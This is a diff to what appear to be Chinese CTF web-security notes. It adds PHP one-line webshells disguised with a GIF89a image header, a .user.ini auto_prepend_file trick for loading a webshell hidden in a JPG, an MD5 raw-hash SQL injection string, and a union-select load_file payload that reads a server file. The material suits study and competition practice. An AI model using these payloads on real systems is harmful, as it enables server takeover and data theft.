@@ -95,7 +95,15 @@
 
   ```php
   <?php @eval($_POST[cmd]);?>
+  GIF89a #伪装图片
   <script language='php'>eval($_POST['shell']);</script>
+
+    .user.ini
+  GIF89a                  
+  auto_prepend_file=a.jpg
+  .user.ini实际上就是一个可以由用户“自定义”的php.ini，我们可以自定义除了PHP_INI_SYSTEM以外的模式，在执行php代码之前，系统会对.user.ini先做一个执行，然后才执行其他的php文件。
+
+  我们这边利用.user,ini先执行auto_prepend_file函数，auto_prepend_file表示在php程序加载第一个php代码前加载的php文件，也就是先加载了a.jpg里面的文件，即一句话木马。
   ```
 
 * md5 注入
@@ -104,6 +112,14 @@
   ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ' or '6
   ```
 
-  ​
+* robots.txt 
+
+* 反序列化漏洞
+
+* load_file()函数
+
+  ```
+  /view.php?no=0 union/**/select 1,load_file('/var/www/html/flag.php'),3,4
+  ```
 
   ​
